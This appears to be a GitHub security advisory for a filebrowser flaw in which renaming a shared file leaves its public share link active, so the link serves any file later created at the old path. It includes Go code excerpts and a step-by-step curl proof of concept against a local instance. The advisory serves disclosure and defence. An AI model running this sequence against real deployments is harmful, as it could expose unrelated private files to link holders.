# GHSA-m8v4-4w34-rrvf / CVE-2026-82237 — Renaming a shared file leaves the public share link behind

- Severity: low (CVSS 3.1)
- CWEs: CWE-459
- Affected: github.com/filebrowser/filebrowser/v2 <= 2.63.23
- Published: 2026-08-14T08:09:11Z
- URL: https://github.com/filebrowser/filebrowser/security/advisories/GHSA-m8v4-4w34-rrvf

---

## Summary

Share records are keyed by path and are cleaned up when the shared path is deleted, but not when it is
renamed. After a shared file is renamed, its share record survives. The link 404s only while the old path
is absent; as soon as any file appears at that path again — the owner re-uploads, another user with
create permission writes there, a hook produces it — the old unauthenticated link, with its original
password and expiry, serves the new and unrelated file.

Verified at v2.63.23, the final release. Every version that has both shares and rename is affected.

## Details

The delete handler removes the shares that its delete invalidated:

```go
// http/resource.go:110 (resourceDeleteHandler)
err = d.store.Share.DeleteWithPathPrefix(file.Path, d.user.ID)
```

The rename branch of `patchAction` deletes thumbnails and moves the file, with no equivalent cleanup:

```go
// http/resource.go:398-423 (patchAction, action == "rename")
	// delete thumbnails
	err = delThumbs(ctx, fileCache, file)
	if err != nil {
		return err
	}

	return fileutils.MoveFile(d.user.Fs, src, dst, d.settings.FileMode, d.settings.DirMode)
```

`resourceDeleteHandler` is the only caller of `DeleteWithPathPrefix` anywhere in the codebase.

`withHashFile` resolves the stored path lazily, on every request (`http/public.go:41-53`): it builds a
`FileInfo` for `link.Path` each time, so the link 404s while the path is missing and serves whatever file
exists there once it reappears. The existence check added to `sharePostHandler`
(`http/share.go:159-168`) only guards the moment the share is created — a rename re-creates the dangling
condition afterwards.

## PoC

```bash
BASE=http://127.0.0.1:8099
TOKEN=$(curl -s -X POST $BASE/api/login -H 'Content-Type: application/json' \
  -d '{"username":"user","password":"…"}')

# 1. create and share a file
curl -s -X POST "$BASE/api/resources/a.txt" -H "X-Auth: $TOKEN" --data 'OLD-CONTENT'
HASH=$(curl -s -X POST "$BASE/api/share/a.txt" -H "X-Auth: $TOKEN" -d '{}' | jq -r .hash)

# 2. unauthenticated download works
curl -s "$BASE/api/public/dl/$HASH/a.txt"          # → OLD-CONTENT

# 3. rename the file (no share cleanup on this path)
curl -s -X PATCH "$BASE/api/resources/a.txt?action=rename&destination=%2Fb.txt" \
  -H "X-Auth: $TOKEN"

# 4. link is dormant while the path is absent
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api/public/dl/$HASH/a.txt"   # → 404

# 5. a new, unrelated file lands at the old path
curl -s -X POST "$BASE/api/resources/a.txt" -H "X-Auth: $TOKEN" --data 'NEW-CONTENT'

# 6. the OLD link now serves the NEW file, unauthenticated
curl -s "$BASE/api/public/dl/$HASH/a.txt"          # → NEW-CONTENT   (replayed 2/2)
```

Sharing a file, **deleting** it and recreating it leaves the share dead (404) — the delete path cleans
up, so the gap is specific to rename.

## Impact

A previously circulated public link silently resurrects and exposes a new, unrelated file that happens to
land at the old path — unauthenticated, under the original link's password and expiry. A user who
re-creates a file under a name they once shared reasonably assumes it is private, while the old link
still serves it. Exploitation is opportunistic rather than directed: the attacker holds an old link and
waits for content to reappear at that path.

## Patches

None. The project is no longer maintained and no fix will ship.

## Workarounds

- Revoke the link by hand after renaming a shared path: list shares with `GET /api/shares` and delete
  with `DELETE /api/share/{hash}`. Administrators see and can revoke every user's shares.
- Give shares an expiry and a password, so a resurrected link is time-bounded and not anonymously usable.

## References

- GHSA-3q2p-72cj-682c — pre-created shares for non-existent paths (the creation-time existence check).
- GHSA-pp88-jhwj-5qh5 — stale share left by a trailing-slash delete (the same impact class, on the delete
  path).
- GHSA-r6pg-pg54-rcr5 — share cleanup on delete matches only the deleter's own shares.
